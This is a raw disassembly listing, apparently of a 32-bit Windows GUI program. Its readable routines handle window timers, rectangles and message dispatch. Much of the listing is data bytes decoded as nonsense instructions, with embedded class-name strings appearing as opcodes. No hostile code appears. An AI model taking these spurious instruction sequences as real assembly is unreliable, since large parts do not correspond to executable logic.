je r-xdata
add [ eax ] bh
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
jl r-xdata
insb
jae r-xdata
inc ebx
add [ eax + eax + 0xc80044 ] bl
inc esp
add al cl
fild [ ebx ]
add dl dl
inc ebx
add [ ebp + ebx * 8 + 0x43 ] dl
add ah cl
fadd [ ebx ]
loopne r-xdata
rol [ ebx ] 0x1
mov al dl
inc ebx
add [ esi + ebx * 8 + 0x200c0043 ] cl
inc esp
add [ ecx + eax + 0x44 ] cl
add [ esp + eax * 2 ] ch
inc esp
add al ch
inc esp
inc esp
add ah ah
aas
inc esp
add ah cl
inc esp
inc esp
add [ eax + 0x12 ] dh
inc ebx
add al bh
or al 0x44
add [ eax - 0x33ffbbe6 ] bl
adc al [ ebx ]
adc [ edi ] 0x44
add [ eax + 0x30004415 ] dh
sbb eax [ eax + eax + 0x34 ]
sbb eax [ eax + eax - 0x14 ]
sbb [ eax + eax - 0x6c ] eax
sbb [ eax + eax + 0xc ] eax
inc esi
inc esp
add [ ebx + 0x44 ] ch
add [ eax ] al
pop eax
inc esp
add [ eax + 0x78004442 ] cl
inc ebp
inc esp
add ah bl
adc al [ ebx ]
and [ esi + 0x50042 ] cl
or al 0xb0
push cs
mov al 0x5
add ch bh
push [ esi + 0x428db8ff ]
add al bh
lea eax [ edx ]
or al 0x8e
inc edx
add [ esi + ecx * 4 ] ah
inc edx
add [ ecx + ecx * 4 + 0x54110042 ] dl
inc ebx
jne r-xdata
inc ecx
add [ ebx + ecx * 4 - 0x2d37ffbe ] ah
inc ebx
add [ eax - 0x1fffbd75 ] bh
inc esp
add [ esp + eax * 2 ] dh
popad
insb
rcl [ ebx ] 0x41
add [ eax ] bh
add [ eax ] al
[ ebp + eax * 4 + 0x42 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
jpo r-xdata
inc eax
add [ eax ] al
add bh bh
dec esp
test [ edx ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add al [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
jl r-xdata
add [ eax ] al
adc [ eax ] al
inc eax
add [ eax ] al
dec [ ebp + eax * 4 + 0x42 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
cld
je r-xdata
mov eax [ edx ]
loopne r-xdata
add [ eax ] cl
jl r-xdata
je r-xdata
add [ eax + 0x3e8 ] al
add eax [ eax ]
or [ ecx + 0x6e ] cl
inc eax
add [ eax ] dh
add [ eax ] al
[ ebp + eax * 4 + 0x42 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x3
add [ eax ] al
inc ebx
add [ eax + eax + 0xc80044 ] bl
inc esp
add al cl
fild [ ebx ]
add dl dl
inc ebx
add [ ebp + ebx * 8 + 0x43 ] dl
add ah cl
fadd [ ebx ]
loopne r-xdata
rol [ ebx ] 0x1
mov al dl
inc ebx
add [ esi + ebx * 8 + 0x200c0043 ] cl
inc esp
add [ ecx + eax + 0x44 ] cl
add [ esp + eax * 2 ] ch
inc esp
add al ch
inc esp
inc esp
add ah ah
aas
inc esp
add ah cl
inc esp
inc esp
add [ eax + 0x12 ] dh
inc ebx
add al bh
or al 0x44
add [ eax - 0x33ffbbe6 ] bl
adc al [ ebx ]
adc [ edi ] 0x44
add [ eax + 0x30004415 ] dh
sbb eax [ eax + eax + 0x34 ]
sbb eax [ eax + eax - 0x14 ]
sbb [ eax + eax - 0x6c ] eax
sbb [ eax + eax + 0xc ] eax
inc esi
inc esp
add [ ebx + 0x44 ] ch
add [ eax ] al
pop eax
inc esp
add [ eax + 0x78004442 ] cl
inc ebp
inc esp
add ah bl
adc al [ ebx ]
and [ esi + 0x540b0042 ] cl
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
je r-xdata
xor al 0x40
add [ eax + 0x21 ] dh
inc esp
add [ eax ] bh
inc ecx
add ah bh
insd
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
mov eax eax
and [ edx + eax * 2 ] bh
pop es
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
xor al [ eax ]
push esp
xor al [ eax ]
dec eax
mov [ edx ] eax
adc [ ecx + 0x44 ] dl
add [ eax ] bh
sbb [ eax + eax + 0x34 ] eax
add [ ebp + 0x41 ] dl
add [ ebp + 0x41 ] cl
add [ eax + ebp * 4 + 0x41 ] dh
add [ eax + 0x24004288 ] bh
dec esp
inc esp
add [ eax + 0x51 ] al
inc esp
add [ eax + edx * 2 - 0x2ec3ffbc ] cl
inc ebx
add [ eax - 0x3fffbbba ] ah
inc esi
inc esp
add al bl
inc ebx
inc esp
add [ eax + edx * 8 - 0x2f77ffbd ] al
inc ebx
add [ eax + ebp * 4 + 0x41 ] ch
fild [ ebx ]
insb
test al 0x41
add [ edx + eax ] ah
add [ eax ] al
test bh cl
inc edx
add [ eax + ebp * 4 + 0x41 ] dl
add ah dh
xor al 0x40
add [ eax - 0x3ffbe5f ] ch
xor al 0x40
add [ eax + 0x21 ] dh
inc esp
or [ 0x69420800 ] 0x44
imul ecx [ ebp + 0x6f ] 0x8b606564
inc ebx
add al bh
inc edx
add [ edi ] al
or edx [ edx + edx * 2 + 0x61 ]
imul ebp [ fs : edi + 0x47 ] 0x70756f72
xchg esp eax
jl r-xdata
inc ecx
add [ ebx + ecx * 4 - 0x2d37ffbe ] ah
inc ebx
add [ eax - 0x1fffbd75 ] bh
fild [ ebx ]
insb
test al 0x41
add [ ebp + 0x41 ] dl
add [ esp + eax * 2 ] dh
outsd
insd
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
sbb [ ebx + 0x42 ] bh
add al cl
rol [ edx ] 0x1
or eax [ eax ]
or [ ebp + 0x78 ] al
je r-xdata
add [ eax ] al
add [ eax ] al
xor ah 0xff
imul ebp [ edi + 0x6e ] sub_41b768
jo r-xdata
add [ eax ] al
add [ eax + 0x3 ] al
add [ esp + edi * 2 ] bl
inc edx
add [ edi ] ch
add [ eax ] cl
inc ebp
js r-xdata
xor al [ eax ]
push esp
xor al [ eax ]
dec eax
mov [ edx ] eax
adc [ ecx + 0x44 ] dl
add [ eax ] bh
sbb [ eax + eax + 0x34 ] eax
inc esp
and [ eax + eax + 0x38 ] eax
je r-xdata
add bh bh
cwde
fild [ ebx ]
mov ah 0xdf
inc ebx
add [ eax ] al
add [ eax ] al
add [ 0xfff0000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
js r-xdata
sub dh bl
inc ebx
add [ esi + edi * 8 ] cl
inc ebx
je r-xdata
add [ ebp + 0x41 ] cl
add [ eax + ebp * 4 + 0x41 ] dh
add [ eax + 0x24004288 ] bh
dec esp
inc esp
add [ eax + 0x51 ] al
inc esp
add [ eax + edx * 2 - 0x2ec3ffbc ] cl
inc ebx
add [ eax - 0x3fffbbba ] ah
inc ecx
insb
jae r-xdata
inc ebx
je r-xdata
adc [ eax ] al
pop es
inc ebx
outsd
insb
jne r-xdata
adc [ eax ] al
sbb al 0x2
add bh bh
sbb al 0x8c
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
outsb
jae r-xdata
fld [ ebx ]
add [ eax ] al
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307000e ] al
popad
jo r-xdata
fiadd [ ebx ]
or al 0xfe
insb
jae r-xdata
add [ esp + edi * 2 + 0x42 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add [ gs : eax ] dl
xor eax [ eax + edi * 2 - 0x7c ]
inc ebx
add [ edx ] bh
add bh bh
jpe r-xdata
adc [ eax ] al
movsd [ edi ] [ esi ]
add [ eax ] eax
add [ eax + 0x4208000d ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x6065646f
mov eax [ ebx ]
clc
add dh bh
sbb al 0xdf
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ ecx ] ah
add bh bh
dec esp
rol [ ebx ] 0x1
call sub_42c198
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
add [ eax + 0x5b004384 ] dl
add [ eax ] al
dec [ ebx + edx * 8 ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
mov eax 0x6100438b
add [ eax ] al
dec [ ecx + edx * 8 + 0x43 ]
add al ch
rol [ ebx ] 0x1
inc esi
inc esp
add al bl
inc ebx
inc esp
add [ eax + edx * 8 - 0x2f77ffbd ] al
add al al
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + edi * 2 + 0x42 ] ah
add [ eax ] ch
add al [ eax ]
add ah cl
jpe r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
movsd [ edi ] [ esi ]
add [ eax + ebp * 4 + 0x41 ] dl
add ah dh
xor al 0x40
add [ eax - 0x3ffbe5f ] ch
jae r-xdata
add bh bh
in al dx
fiadd [ ebx ]
cld
fiadd [ ebx ]
add [ eax ] al
add [ eax - 0x80000000 ] al
push ss
add [ esi + eax * 2 ] al
jb r-xdata
add [ 0x6d657449 ] al
adc [ eax ] al
sbb [ edx ] al
add bh bh
push esp
mov [ edx ] es
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
pop ss
add [ ecx ] cl
dec ecx
je r-xdata
add [ eax ] al
add [ ebx ] dl
add [ eax ] cl
inc esp
jb r-xdata
mov eax [ ebx ]
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
add [ eax + 0x1 ] al
mov [ ebx ] es
je r-xdata
add [ esi ] cl
insd
dec ecx
outsb
js r-xdata
outsd
outsb
je r-xdata
adc [ esi ] 0x0
add al 0x46
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push ds
outsb
je r-xdata
add bh bh
in al 0x2
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0019 ] al
outsd
outsb
jae r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x46040016 ] al
sbb eax 0x2140041
add bh bh
ror [ edx + eax * 2 + 0x100 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49050018 ] al
je r-xdata
add [ eax - 0x80000000 ] al
and [ eax ] eax
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
add [ ecx ] 0x0
add [ eax ] al
sbb eax 0x61500b00
jb r-xdata
popad
arpl [ ebx + 0x67 ] bp
jb r-xdata
or edx [ eax + 0x61 ]
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] al
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x1 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
clc
push edi
inc esp
add [ eax + eax + 0x1fe00 ] bh
add [ eax ] al
add [ eax ] al
sbb eax [ eax ]
adc [ eax + 0x61 ] dl
jb r-xdata
add [ eax ] eax
add [ eax ] al
jae r-xdata
insd
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
imul ebp [ esi + 0x74 ] r-xdata
xchg esp eax
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
je r-xdata
jne r-xdata
add [ ecx ] 0x0
add [ eax ] al
pop ds
add [ esi ] cl
outsb
je r-xdata
fild [ ebx ]
add [ eax ] eax
add [ eax ] al
push eax
popad
jb r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al [ eax ]
push cs
sbb ch bl
inc ebx
add [ esi + edi * 8 + 0x43 ] cl
add [ eax + 0x1 ] al
jo r-xdata
push eax
popad
jb r-xdata
push cs
je r-xdata
add [ eax ] al
add [ eax + 0x4f090029 ] al
outsb
js r-xdata
adc [ eax ] al
0x6cff0000 0x43df
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
sbb al 0x0
add [ fs : eax ] dl
inc eax
add [ edx ] bl
add bh bh
mov esp 0x10043df
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
outsb
je r-xdata
add [ edx ] cl
push eax
popad
jb r-xdata
outsd
insb
outsd
jb r-xdata
movsb [ edi ] [ esi ]
add [ eax ] eax
[ eax + ecx * 2 ]
outsb
jne r-xdata
jo r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
and al 0xdf
inc ebx
add [ ecx ] al
push ebx
je r-xdata
rcl [ bp + di ] 0x41
add al al
add [ eax ] eax
pop [ ebx ]
sbb [ ecx ] al
push eax
outsd
jo r-xdata
inc edi
inc esp
add [ eax + ecx * 2 ] dl
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
push 0x6948776f
outsb
je r-xdata
adc [ eax ] al
test eax 0x68ff0001
inc edi
adc [ eax ] al
cdq
add [ eax ] al
dec [ eax - 0x21 ]
inc ebx
add [ eax ] dl
fild [ ebx ]
add [ eax ] al
adc al ch
adc al 0x56
jb r-xdata
push ebx
je r-xdata
jb r-xdata
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ edi + 0x6e ] ecx
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090020 ] al
aam 0x44
add [ eax + eax ] bh
push [ eax + 0x10043dd ]
inc ebp
loopne r-xdata
inc esp
outsd
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
jb r-xdata
inc ebp
outsb
inc esp
jb r-xdata
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc eax [ ecx ]
enter 0x1 0xff
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
push es
dec edi
outsb
inc ebp
js r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0027 ] al
outsb
inc esp
jb r-xdata
pop [ ebx ]
call 0xffffffffe9418185
arpl [ ebx + 0x68 ] bp
pop [ ebx ]
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : ebx ] cl
dec edi
outsb
inc ebx
add al 0x89
inc ebp
in al 0x8b
inc ebp
clc
dec [ ebx + 0x508b0845 ]
or al 0x8b
inc ebp
or [ ebx + 0x408bf840 ] cl
adc al ch
0xff55
inc esp
jb r-xdata
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_41d8ec
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
je r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc esp
jb r-xdata
mov ecx 0x2
call sub_41e0c8
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_41d8ec
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_41e0c8
pop ebx
mov esp ebp
pop ebp
retn
fmul [ ebx + 0x408b0845 ]
clc
lea eax [ bx + si ]
inc ebp
hlt
xchg ecx eax
inc ebx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002d ] al
outsb
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
adc eax [ ecx ]
rol [ ecx ] 0x0
jo r-xdata
and al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0xc0656c62
adc eax [ ecx ]
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
lodsb [ esi ]
inc [ ebx ]
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0700
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : esi ] cl
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
add [ ecx ] 0x0
add [ eax ] al
mov es [ ebx ]
[ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0028 ] al
outsb
inc esp
jb r-xdata
add [ eax + 0x4f07002b ] al
add [ eax ] al
dec edi
jbe r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x50 ] bp
pop [ ebx ]
or [ ecx ] al
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ edi + 0x6e ] ecx
sub_4282a0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx - 0x4 ]
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_41d8ec
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_41e0c8
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_41d8ec
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_41e0c8
pop ebx
mov esp ebp
pop ebp
retn
sub_428364
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx 0x1
call sub_41da18
mov eax [ ebp - 0x4 ]
dec [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
dec [ eax + 0x8 ]
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
inc [ eax + 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
dec ebx
push ebp
call sub_4282a0
pop ecx
push 0xffffffff
push 0xffffffff
mov eax [ ebp - 0x4 ]
push eax
call InflateRect
test ebx ebx
jg r-xdata
sub_4283c4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41a0e4
mov [ esi + 0x40 ] 0x1
mov [ esi + 0x30 ] 0x3e8
push esi
push sub_42844c
call sub_41b230
mov [ esi + 0x34 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_428414
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov [ esi + 0x40 ] 0x0
mov eax esi
call sub_4284c0
mov eax [ esi + 0x34 ]
call sub_41b2e4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a130
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_42844c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov esi [ ebx ]
cmp esi 0x113
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
push ebp
push sub_428486
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_40349c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4284c0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_42853f
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call KillTimer
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428546
lea eax [ ebp - 0x4 ]
call sub_404074
retn
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp [ ebx + 0x3a ] 0x0
je r-xdata
push 0x0
push esi
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call SetTimer
test eax eax
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
sub_42859c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fadd [ esi + 0x42 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0x86
inc edx
add al cl
xchg [ edx ] al
sbb al 0x2
add [ eax ] al
hlt
sub_428700
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_434b60
mov edx edi
mov eax [ esi + 0x210 ]
call sub_413c88
xor edx edx
mov eax edi
call sub_43dd18
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x64 ]
xor edx edx
mov eax edi
call sub_43df6c
mov [ edi + 0x124 ] esi
mov [ edi + 0x120 ] sub_428b30
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_428784
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x210 ]
mov edx esi
call sub_413f80
mov edx ebx
and dl 0xfc
mov eax esi
call sub_440448
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_4287bc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_428821
push [ fs : eax ]
mov [ fs : eax ] esp
mov si [ ebx + 0x6 ]
test si si
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
je r-xdata
cmp si 0x5
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_434e60
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
sub_428826
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45dfe8
call sub_403aa8
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42884c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_4435dc
mov edx ebx
mov eax [ edi + 0x30 ]
mov si 0xffba
call sub_40349c
cmp [ ebx ] 0x8
je r-xdata
mov eax [ edi + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
jne r-xdata
cmp [ ebx ] 0x20
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov [ ebx ] 0x0
sub_42888c
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_443424
mov edx esi
mov cl [ esp ]
mov eax [ ebx + 0x30 ]
mov si 0xffbc
call sub_40349c
pop edx
pop esi
pop ebx
retn
sub_4288b8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_431214
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebx + 0x210 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov esi eax
mov [ ebx + 0x214 ] esi
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] sub_428b68
mov [ ebx + 0x218 ] 0xffffffff
mov [ ebx + 0x21c ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_428948
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_428bdc
mov eax [ esi + 0x214 ]
xor edx edx
mov [ eax + 0x20 ] edx
mov [ eax + 0x24 ] edx
call sub_4032a0
